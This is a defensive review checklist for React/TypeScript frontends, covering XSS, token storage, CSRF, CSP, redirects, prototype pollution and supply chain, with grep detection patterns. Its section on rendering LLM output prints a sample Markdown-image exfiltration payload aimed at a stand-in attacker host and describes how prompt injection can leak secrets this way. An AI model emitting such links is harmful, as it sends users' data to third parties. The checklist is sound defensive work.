# Frontend review checklist — React / TypeScript

Review side of the `react-frontend` skill (its security rules are the preventive part).
Covers Vite SPAs and React Router in framework mode (loaders/actions, SSR), with TanStack
Query/Router, Zustand, React Hook Form / TanStack Form + Zod.

Frontend findings are often only half the story — the backend decides whether a missing
frontend control is exploitable. Note the dependency in the finding ("exploitable only if
the API accepts …") and lower the Confidence if the backend is out of scope.

Grep patterns are ripgrep regexes (`rg -n -t ts -t js '<pattern>'` or the Grep tool;
`-t ts` includes `.tsx`).

---

## 0. Recon

```bash
rg -n -t ts -t js 'createBrowserRouter|createRouter|routes\.ts|loader\s*[:=(]|action\s*[:=(]'  # routing, loaders/actions
rg -n -t ts -t js 'QueryClient|useQuery|useMutation|create\(\)|persist\('                     # data + state
rg -n -t ts -t js 'fetch\(|axios|ky\b|ofetch|baseURL|credentials\s*:'                        # API client
rg -n -t ts -t js 'oidc-client|react-oidc|@auth0|msal|keycloak|Authorization|Bearer'          # auth model
rg -n -t ts -t js 'import\.meta\.env|process\.env'                                            # env usage
rg -n 'sourcemap|envPrefix|define\s*:|drop\s*:' vite.config.* react-router.config.* 2>/dev/null
rg -n 'add_header|Content-Security-Policy' -g '*.conf' -g 'Caddyfile' -g '*.yaml' -g '*.yml'  # headers at proxy
```

Write down: rendering mode (SPA / SSR), auth model (httpOnly cookie session, BFF, or
bearer tokens in the browser via an OIDC library), where security headers are set, which
components render user- or model-generated content.

---

## 1. XSS sinks — A05:2025

- [ ] `dangerouslySetInnerHTML` only with sanitized content (DOMPurify at render time,
      default config; no `ADD_TAGS: ['script']`, `ADD_ATTR` with event handlers,
      `ALLOW_UNKNOWN_PROTOCOLS`, `SAFE_FOR_TEMPLATES` misuse) [1.3.1] (CWE-79).
- [ ] No `innerHTML` / `outerHTML` / `insertAdjacentHTML` / `document.write` via refs or
      DOM APIs with untrusted data; text goes through React or `textContent` [3.2.2]
      (CWE-79).
- [ ] No `eval`, `new Function`, `setTimeout("string")`, `setInterval("string")`
      [1.3.2] (CWE-95).
- [ ] User-controlled URLs in `href`, `src`, `action`, `formAction`, `window.open`,
      `location.href`, `iframe src`: scheme allowlist (`https:`, `http:`, `mailto:`) —
      don't rely on React's `javascript:` URL handling, it doesn't cover `location`/
      `window.open` [1.2.2] (CWE-79).
- [ ] `<iframe srcDoc>` / `<iframe src>` with user content: `sandbox` attribute without
      `allow-scripts allow-same-origin` together (CWE-79).
- [ ] User-uploaded HTML/SVG never rendered inline or opened via `URL.createObjectURL` in
      the app's origin [1.3.4, 3.2.1] (CWE-79).
- [ ] SSR: custom state serialization into `<script>` (`JSON.stringify` into HTML)
      escapes `<`, `>`, `&`, U+2028/2029 [1.2.3] (CWE-79).
- [ ] Inline `style` / CSS from user input (CSS injection, UI redressing) (CWE-79).
- [ ] `target="_blank"` to untrusted URLs: `rel="noopener noreferrer"` (modern browsers
      imply `noopener`; Info at most) (CWE-1022).

```bash
rg -n -t ts -t js 'dangerouslySetInnerHTML|innerHTML|outerHTML|insertAdjacentHTML|document\.write'
rg -n -t ts -t js 'DOMPurify|sanitize\(|ADD_TAGS|ADD_ATTR|ALLOW_UNKNOWN_PROTOCOLS'
rg -n -t ts -t js '\beval\(|new Function\(|setTimeout\(\s*["'\''`]|setInterval\(\s*["'\''`]'
rg -n -t ts -t js 'href=\{|src=\{|window\.open\(|location\.(href|assign|replace)\s*[=(]|srcDoc'
rg -n -t ts -t js 'createObjectURL|JSON\.stringify\([^)]*\)\s*\}?\s*<\/script'
```

---

## 2. Tokens, sessions and authorization — A07:2025 · A01:2025

- [ ] No access/refresh/ID tokens or session ids in `localStorage`, `sessionStorage`,
      IndexedDB, persisted Zustand stores or non-`HttpOnly` cookies [14.3.3, 10.1.1]
      (CWE-922). Preferred: `HttpOnly` cookie session or BFF.
- [ ] If the SPA must hold bearer tokens (OIDC public client): Authorization Code + PKCE,
      no implicit flow, tokens in memory, refresh token rotation, OIDC library
      `userStore` not set to `localStorage` [10.2.1, 10.1.1] (CWE-922).
- [ ] No tokens or PII in URLs (query, hash, router search params) — they end up in logs,
      history and `Referer` [14.2.1] (CWE-598).
- [ ] Route guards are UX only. Data the user may not see must not be in API responses
      — "hidden in the UI" is a finding only together with the API response that
      delivers it [8.3.1] (CWE-602).
- [ ] Role/permission flags in client state aren't used as the only check before an
      action that the API doesn't re-check (verify backend) (CWE-602).
- [ ] Password fields: `type="password"`, correct `autocomplete`, paste allowed, no
      composition rules in client validation [6.2.5, 6.2.6, 6.2.7].
- [ ] Tokens, user objects or API responses with personal data not written to
      `console.*` (CWE-532).

```bash
rg -n -t ts -t js 'localStorage|sessionStorage|indexedDB|idb-keyval|persist\(|createJSONStorage'
rg -n -t ts -t js -i '(access|refresh|id)_?token|jwt|bearer'
rg -n -t ts -t js 'userStore|WebStorageStateStore|response_type|implicit'
rg -n -t ts -t js 'console\.(log|debug|info)\(.*(token|user|password|auth|response)'
```

---

## 3. CSRF and cross-origin — A01:2025

With cookie auth:

- [ ] The API client sends the CSRF header (`X-CSRF-Token` / `X-Requested-With`) on
      every `POST/PUT/PATCH/DELETE`, centrally (fetch wrapper / axios interceptor), not
      per call [3.5.1] (CWE-352).
- [ ] `credentials: 'include'` / `withCredentials: true` only for the own API origin, not
      for third-party requests (CWE-201).
- [ ] No state-changing requests via `GET`, `<img>`, or plain cross-origin `<form>`
      [3.5.3] (CWE-352).
- [ ] React Router framework mode: actions handle form posts — they need the same CSRF
      protection as API routes (Origin check + token); the framework doesn't add it
      (CWE-352).
- [ ] `postMessage` listeners check `event.origin` against an exact allowlist and
      validate the message shape; `postMessage(data, '*')` never carries sensitive data
      [3.5.5] (CWE-346).

```bash
rg -n -t ts -t js 'credentials\s*:\s*["'\'']include|withCredentials|X-CSRF|csrf|X-Requested-With'
rg -n -t ts -t js 'addEventListener\(\s*["'\'']message|onmessage|postMessage\('
```

---

## 4. Security headers and CSP — A02:2025

- [ ] CSP is delivered as an **HTTP header** (nginx/proxy/SSR server). `<meta>` CSP
      ignores `frame-ancestors`, `report-uri`/`report-to` and `sandbox` [3.4.3, 3.4.6].
- [ ] CSP has at least `object-src 'none'`, `base-uri 'none'` (or `'self'`), a script
      allowlist or nonces/hashes, no `'unsafe-eval'` and no `'unsafe-inline'` for scripts
      in production; `frame-ancestors 'none'` or an allowlist [3.4.3, 3.4.6] (CWE-1021,
      CWE-79).
- [ ] `connect-src` and `img-src` limited — open `img-src` is the exfiltration channel for
      injected or model-generated markdown images.
- [ ] HSTS, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, COOP on HTML responses
      [3.4.1, 3.4.4, 3.4.5, 3.4.8].
- [ ] Header config not in the repo → "Out of scope / not checked", not a finding.

```bash
rg -n -i 'content-security-policy|frame-ancestors|unsafe-inline|unsafe-eval|strict-transport|referrer-policy|cross-origin-opener'
rg -n -t html -i 'http-equiv'
```

---

## 5. Redirects and navigation — A01:2025

- [ ] `?redirect=`, `returnTo`, `next`, `callbackUrl` after login/logout: only same-origin
      relative paths — starts with `/`, not `//` or `/\`; or
      `new URL(value, location.origin).origin === location.origin` [3.7.2] (CWE-601).
- [ ] `navigate(param)`, `redirect(param)` in loaders/actions, `window.location = param`
      with unvalidated input (CWE-601).

```bash
rg -n -t ts -t js -i 'redirect|returnTo|return_to|next=|callbackUrl|searchParams\.get\(' 
rg -n -t ts -t js 'navigate\(\s*\w|redirect\(\s*\w|location\.(href|assign|replace)'
```

---

## 6. Logout and client storage — V14.3

- [ ] Logout calls the backend (server-side invalidation) [7.4.1] (CWE-613).
- [ ] Logout clears client data: `queryClient.clear()`, Zustand stores reset and
      persisted storage cleared (`persist.clearStorage()`), user data in
      `localStorage`/`sessionStorage`/IndexedDB removed, service-worker caches with
      authenticated responses deleted [14.3.1] (CWE-524).
- [ ] Server sends `Clear-Site-Data: "cache", "storage"` on logout where possible
      [14.3.1].
- [ ] No sensitive data in browser storage at all, apart from session ids in cookies
      [14.3.3] (CWE-922).
- [ ] Service worker doesn't cache authenticated API responses (CWE-524).

```bash
rg -n -t ts -t js -i 'logout|signout|sign_out|clearStorage|queryClient\.(clear|removeQueries)|caches\.(open|delete)|serviceWorker'
```

---

## 7. Environment, build and shipped code — A02:2025

- [ ] Everything in `import.meta.env.VITE_*` is **public** — no secrets, private keys,
      write-capable API keys, internal URLs that grant access [13.3.1] (CWE-798,
      CWE-200).
- [ ] `envPrefix` not widened (e.g. `''` exposes all env vars); `define` doesn't inline
      `process.env` wholesale (CWE-200).
- [ ] Source maps not publicly served in production (`build.sourcemap: true` uploaded
      to the web root), unless intentionally public (CWE-540).
- [ ] `console`/`debugger` dropped in production builds (esbuild `drop`) — robust, unlike
      regex stripping (CWE-532).
- [ ] Dev-only code (mock service worker, debug panels, feature-flag overrides, test
      routes) not reachable in production [15.2.3] (CWE-489).
- [ ] React Router framework: secrets only in `.server.ts` modules; loader data is sent
      to the client — never return secrets or full DB rows (CWE-200).

```bash
rg -n 'VITE_\w*(SECRET|KEY|TOKEN|PASSWORD|PRIVATE)\w*' -g '!node_modules'
rg -n 'envPrefix|sourcemap|define\s*:|drop\s*:' -g 'vite.config.*' -g 'react-router.config.*'
rg -n -t ts -t js 'msw|setupWorker|__DEV__|import\.meta\.env\.DEV'
```

---

## 8. Prototype pollution and type confusion — V15.3

- [ ] No deep merge / path-set of untrusted JSON or query strings into objects
      (`lodash.merge`, `_.set`, `_.defaultsDeep`, custom `deepMerge`) without blocking
      `__proto__`, `constructor`, `prototype` [15.3.6] (CWE-1321).
- [ ] Untrusted keys go into `Map` or `Object.create(null)`; Zod `.strict()` /
      `z.record` with key validation at boundaries (CWE-1321).
- [ ] Query parsers (`qs`) not configured with `allowPrototypes: true` (CWE-1321).
- [ ] Strict equality (`===`) in security-relevant comparisons [15.3.5] (CWE-1024).

```bash
rg -n -t ts -t js 'merge\(|mergeWith\(|defaultsDeep|_\.set\(|setWith\(|deepMerge|Object\.assign\(\s*\w+,\s*JSON\.parse'
rg -n -t ts -t js '__proto__|allowPrototypes|\[key\]\s*=|\[k\]\s*='
```

---

## 9. DOM clobbering — V3.2 (L3)

- [ ] Code doesn't read config or flags from implicit globals (`window.foo`,
      `document.foo`) that injected `id`/`name` attributes could shadow — relevant where
      sanitized user HTML is rendered [3.2.3] (CWE-79).
- [ ] DOMPurify keeps `SANITIZE_DOM` (default `true`); consider `SANITIZE_NAMED_PROPS`.

```bash
rg -n -t ts -t js 'window\.\w+\s*(\|\||\?\?)|document\.\w+\s*(\|\||\?\?)|SANITIZE_DOM|SANITIZE_NAMED_PROPS'
```

---

## 10. Rendering Markdown and LLM output — LLM05:2025

Model output and user Markdown are untrusted HTML sources.

- [ ] `react-markdown` is safe by default; `rehype-raw` without `rehype-sanitize` (or a
      custom `urlTransform` that returns URLs unchecked) re-enables XSS [1.3.5]
      (CWE-79).
- [ ] `marked` / `markdown-it` / `showdown` output into `dangerouslySetInnerHTML` only
      through DOMPurify; `markdown-it({ html: true })` is a candidate (CWE-79).
- [ ] Images and links from model output: allowlist of hosts or proxy, or a tight CSP
      `img-src` — otherwise prompt injection exfiltrates data via
      `![](https://attacker/?q=<secret>)` (CWE-201).
- [ ] Mermaid/diagram renderers with model or user input use `securityLevel: 'strict'`
      (CWE-79).
- [ ] Code blocks from the model are displayed, never executed (CWE-94).
- [ ] Confirmation dialogs for agent/tool actions show the actual operation and
      parameters from the server, not the model's description of them (ASI09).

```bash
rg -n -t ts -t js 'react-markdown|rehype-raw|rehype-sanitize|urlTransform|transformLinkUri|marked|markdown-it|showdown|mermaid|securityLevel'
```

---

## 11. Third parties and data leaving the app — A03:2025 · V14.2

- [ ] Third-party scripts from CDNs pinned and loaded with SRI (`integrity`,
      `crossorigin`) — or a documented decision [3.6.1] (CWE-353, CWE-829).
- [ ] No PII/tokens sent to analytics, error trackers (Sentry `beforeSend` scrubbing),
      chat widgets [14.2.3] (CWE-359).
- [ ] Error boundaries don't render raw backend error details (CWE-209).

```bash
rg -n '<script[^>]+src=["'\'']https?://' -g '*.html' -g '*.tsx'
rg -n -t ts -t js 'Sentry\.init|beforeSend|posthog|gtag|analytics|segment|hotjar|intercom'
```

---

## 12. Dependencies and supply chain — A03:2025

- [ ] Lockfile committed (`pnpm-lock.yaml`/`package-lock.json`), CI installs frozen
      (`pnpm install --frozen-lockfile` / `npm ci`) [15.2.4].
- [ ] Install scripts restricted (pnpm `onlyBuiltDependencies` / `ignore-scripts`)
      for new dependencies with `postinstall` (CWE-506).
- [ ] Scoped/private packages bound to the right registry in `.npmrc` (dependency
      confusion) [15.2.4] (CWE-427).
- [ ] New packages: maintained, not typo-similar to popular names, license acceptable;
      tiny packages for trivial tasks avoided.
- [ ] Known vulnerabilities → `secrets-and-dependencies.md` (dependency audit).

---

## Mapping: OWASP Top 10:2025 → sections

| Id | Name | Sections |
|---|---|---|
| A01:2025 | Broken Access Control | §2, §3, §5 |
| A02:2025 | Security Misconfiguration | §4, §7 |
| A03:2025 | Software Supply Chain Failures | §11, §12 |
| A04:2025 | Cryptographic Failures | §2 (token handling), random values via `crypto.getRandomValues` |
| A05:2025 | Injection | §1, §10 |
| A06:2025 | Insecure Design | §2 (client-only checks) |
| A07:2025 | Authentication Failures | §2, §6 |
| A08:2025 | Software or Data Integrity Failures | §8, §11 (SRI) |
| A09:2025 | Security Logging and Alerting Failures | backend concern; §11 for scrubbing |
| A10:2025 | Mishandling of Exceptional Conditions | §11 error boundaries |
